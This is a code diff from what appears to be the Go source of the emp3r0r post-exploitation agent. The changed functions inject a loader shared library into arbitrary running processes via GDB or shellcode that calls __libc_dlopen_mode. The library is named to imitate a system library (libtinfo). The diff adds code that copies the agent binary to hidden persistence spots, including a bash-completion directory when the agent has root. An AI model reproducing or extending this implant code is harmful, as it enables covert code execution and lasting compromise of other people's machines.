@@ -68,7 +68,7 @@ func gdbInjectSharedLibWorker(path_to_so string, pid int) error {
 
 // Inject loader.so into any process
 func GDBInjectLoader(pid int) error {
-	so_path, err := prepare_inject_loader(pid)
+	so_path, err := prepare_loader_so(pid)
 	if err != nil {
 		return err
 	}
@@ -84,7 +84,8 @@ func GDBInjectSharedLib(pid int) error {
 	return gdbInjectSharedLibWorker(so_path, pid)
 }
 
-func prepare_inject_loader(pid int) (so_path string, err error) {
+// copy agent binary and loader.so to persistent location
+func prepare_loader_so(pid int) (so_path string, err error) {
 	so_path = fmt.Sprintf("/%s/libtinfo.so.2.1.%d",
 		RuntimeConfig.UtilsPath, util.RandInt(0, 30))
 	if os.Geteuid() == 0 {
@@ -102,14 +103,22 @@ func prepare_inject_loader(pid int) (so_path string, err error) {
 		}
 	}
 
-	err = CopySelfTo("/tmp/emp3r0r")
-	return
+	// see loader/elf/loader.c
+	agent_path := fmt.Sprintf("%s/_%s",
+		util.ProcCwd(pid),
+		util.FileBaseName(util.ProcExePath(pid)))
+	if HasRoot() {
+		agent_path = fmt.Sprintf("/usr/share/bash-completion/completions/%s",
+			util.FileBaseName(util.ProcExePath(pid)))
+	}
+
+	return so_path, CopySelfTo(agent_path)
 }
 
 // prepare for guardian_shellcode injection, targeting pid
 func prepare_guardian_sc(pid int) (shellcode string, err error) {
 	// prepare guardian_shellcode
-	proc_exe := util.ProcExe(pid)
+	proc_exe := util.ProcExePath(pid)
 	// backup original binary
 	err = CopyProcExeTo(pid, RuntimeConfig.AgentRoot+"/"+util.FileBaseName(proc_exe))
 	if err != nil {
@@ -185,7 +194,7 @@ func InjectorHandler(pid int, method string) (err error) {
 		}
 
 		// restore original binary
-		err = CopyProcExeTo(pid, util.ProcExe(pid)) // as long as the process is still running
+		err = CopyProcExeTo(pid, util.ProcExePath(pid)) // as long as the process is still running
 
 	case "inject_loader":
 		err = CopySelfTo("/tmp/emp3r0r")
@@ -226,22 +235,10 @@ func InjectSharedLib(so_path string, pid int) (err error) {
 // InjectLoader inject loader.so into any process, using shellcode
 // locate __libc_dlopen_mode in memory then use it to load SO
 func InjectLoader(pid int) error {
-	so_path, err := prepare_inject_loader(pid)
+	so_path, err := prepare_loader_so(pid)
 	if err != nil {
 		return err
 	}
 
 	return InjectSharedLib(so_path, pid)
-	// err = InjectSharedLib(so_path, pid)
-	// if err != nil {
-	// 	return err
-	// }
-	//
-	// // send emp3r0r binary via STDIN of target process
-	// exe_data, err := util.GetProcessExe(os.Getpid())
-	// if err != nil {
-	// 	return fmt.Errorf("GetProcessExe failed: %v", err)
-	// }
-	//
-	// return os.WriteFile(fmt.Sprintf("/proc/%d/fd/0", pid), []byte(exe_data), 0644)
 }
